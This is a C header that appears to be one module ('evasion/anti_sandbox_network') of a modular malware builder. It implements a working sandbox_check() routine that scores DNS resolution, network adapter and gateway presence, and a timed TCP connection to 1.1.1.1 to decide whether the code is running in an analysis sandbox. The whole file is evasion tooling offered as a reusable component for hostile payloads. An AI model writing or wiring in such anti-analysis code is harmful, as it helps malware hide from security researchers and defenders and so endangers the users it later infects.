// chunk: evasion/anti_sandbox_network
// depends: (none)
// provides: sandbox_check
// headers: windows.h,winsock2.h,iphlpapi.h
// risk: low
// note: Network environment checks — DNS resolution, adapter count, gateway presence. Sandboxes have restricted/fake networking.

#ifndef CHUNK_ANTI_SANDBOX_NETWORK
#define CHUNK_ANTI_SANDBOX_NETWORK

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

static int sandbox_check(void) {
    int score = 0;

    // Initialize Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 0;

    // Check 1: DNS resolution — sandboxes may fail to resolve or return fake IPs
    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo("www.microsoft.com", "443", &hints, &result) != 0) {
        score += 2;
    } else {
        freeaddrinfo(result);
    }

    // Check 2: Network adapter count — real machines typically have 2+ adapters
    ULONG bufLen = 0;
    GetAdaptersInfo(NULL, &bufLen);
    if (bufLen > 0) {
        IP_ADAPTER_INFO *adapters = (IP_ADAPTER_INFO *)HeapAlloc(GetProcessHeap(), 0, bufLen);
        if (adapters) {
            int adapter_count = 0;
            int has_gateway = 0;
            if (GetAdaptersInfo(adapters, &bufLen) == ERROR_SUCCESS) {
                IP_ADAPTER_INFO *cur = adapters;
                while (cur) {
                    adapter_count++;
                    if (cur->GatewayList.IpAddress.String[0] != '0' &&
                        cur->GatewayList.IpAddress.String[0] != '\0')
                        has_gateway = 1;
                    cur = cur->Next;
                }
            }
            HeapFree(GetProcessHeap(), 0, adapters);

            if (adapter_count < 1) score += 2;
            if (!has_gateway) score += 1;
        }
    } else {
        score += 2;
    }

    // Check 3: Can we actually make a TCP connection to a well-known service?
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s != INVALID_SOCKET) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        inet_pton(AF_INET, "1.1.1.1", &addr.sin_addr);

        // Non-blocking connect with timeout
        u_long mode = 1;
        ioctlsocket(s, FIONBIO, &mode);
        connect(s, (struct sockaddr *)&addr, sizeof(addr));

        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(s, &wfds);
        struct timeval tv = {3, 0};  // 3 second timeout
        int sel = select(0, NULL, &wfds, NULL, &tv);

        if (sel <= 0)
            score += 1;

        closesocket(s);
    }

    WSACleanup();

    return (score >= 3) ? 1 : 0;
}

#endif
